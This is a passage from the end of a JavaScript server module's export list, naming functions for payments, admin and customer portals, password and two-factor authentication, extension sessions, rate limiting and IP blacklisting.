  failCommercialTxClaim,
  findCommercialPaymentByTx,
  commercialCustomerLockId,
  acquireCommercialCustomerLock,
  renewCommercialCustomerLock,
  releaseCommercialCustomerLock,
  withCommercialCustomerLock,
  processCommercialSale,
  handleCaktoWebhook,
  safeLocalRedirect,
  getVerifyRedirect,
  renderPlanosPage,
  renderPortalDashboard: renderStandalonePortalDashboard,
  renderPortalPlans: renderStandalonePortalPlans,
  renderAdminDashboard,
  renderAdminLogin,
  normalizeAdminCreateLabel,
  parseAdminValidityChange,
  parseAdminBatchDeleteCodes,
  renderAnalyticsLogin,
  renderAnalyticsDashboard,
  renderStandalonePortalLogin,
  renderStandalonePortalRegister,
  renderStandaloneLandingPage,
  renderStandaloneFaqPage,
  renderStandalonePrivacyPage,
  renderStandaloneTermsPage,
  renderStandalone2FAVerify,
  renderStandaloneSetup2FA,
  renderStandalonePortalLinkKey,
  renderStandalonePortalChangePwd,
  renderStandalonePortalChangeEmail,
  renderStandalonePortalResetRequest,
  renderStandalonePortalResetForm,
  _sharedNav,
  renderStandaloneBrand,
  renderStandalone404Page,
  renderStandalone500Page,
  requireSameOriginPost,
  getOrCreateRequestId,
  applyRequestContext,
  simulateCommercialSale,
  resolveLabPlan,
  previewAnalyticsPurge,
  executeAnalyticsPurge,
  ANALYTICS_PURGE_FILTERS,
  getPaymentStats,
  hashPassword,
  verifyPortalPassword,
  hashNewPortalPassword,
  maybeRehashPortalPassword,
  PASSWORD_ITERATIONS_LEGACY,
  PASSWORD_ITERATIONS_CURRENT,
  hashResetToken,
  resolveResetToken,
  claimResetToken,
  claimPortalEmailChange,
  releasePortalEmailChange,
  finalizePortalEmailChange,
  preparePortalUserForEmailChange,
  portalTotpEncrypt,
  portalTotpDecrypt,
  csvCell,
  setSessionCookie,
  clearSessionCookie,
  isAdminSession,
  isAnalyticsSession,
  sessions,
  analyticsSessions,
  SESSION_ABSOLUTE_LIMIT_MS,
  verifyTOTP,
  generateTOTP,
  checkAnalyticsLogin,
  genTotpSecret,
  EXTENSION_SESSION_COLLECTION,
  EXTENSION_SESSION_TTL_MS,
  EXTENSION_ENTITLEMENT_LEASE_MS,
  EXTENSION_FREE_CAPABILITIES,
  EXTENSION_LICENSED_CAPABILITIES,
  hashExtensionSessionToken,
  extensionSubject,
  extensionLicenseIsUsable,
  extensionDevAccessAllowed,
  buildExtensionEntitlement,
  extensionSessionSuccess,
  extensionSessionSecurityFields,
  createExtensionSession,
  readExtensionSession,
  revokeExtensionSession,
  getExtensionBearerToken,
  authenticateExtensionAccount,
  authorizeExtensionKeySession,
  refreshExtensionSession,
  ZVM_BUILD_ENFORCE,
  ZVM_LEGACY_V3_ALLOW,
  legacyV3Allowed,
  ZVM_OFFICIAL_BUILDS,
  ZVM_DENIED_BUILDS,
  zvmSecurityBuildRecognized,
  zvmSecurityBuildDenied,
  zvmSecurityStoredSessionAllowed,
  zvmSecurityStoredSessionDecision,
  zvmSecurityCheckClient,
  zvmSecurityCheckClientShared,
  zvmSecurityConsumeRequestIdShared,
  zvmSecurityClientErrorStatus,
  zvmSecurityDevBuildAllowed,
  ZVM_DEV_SIGNED_BUILDS_ALLOW,
  ZVM_DEV_SIGNING_CONFIG,
  resolveUsageKey,
  normalizeClientIp,
  replaceIpBlacklist,
  readAdminIpBlacklistSnapshot,
  mutateAdminIpBlacklistStrict,
  isIpBlacklisted,
  isAllowedExtensionOrigin,
  getIp,
  checkRateLimit,
  getRateLimitWait,
  handleRequest,
  validateProductionSecurityConfig,
  normalizeTrafficPath,
  recordHttpTraffic,
  httpTrafficSnapshot,
  caktoDurableMailEnabled,
  maskLicenseCode,
  metaEncryptionKey,
  metaConfigured,
  metaPublicConfig,
  metaEncrypt,
  metaDecrypt,
  metaVerifyWebhookSignature,
  metaWebhookEventKeys,
  metaPublicConnection,
  _SEC_HEADERS,
  _CSP_PUBLIC_STRICT,
  _CSP_AUTH_STRICT,
  sendAuthHtml,
});
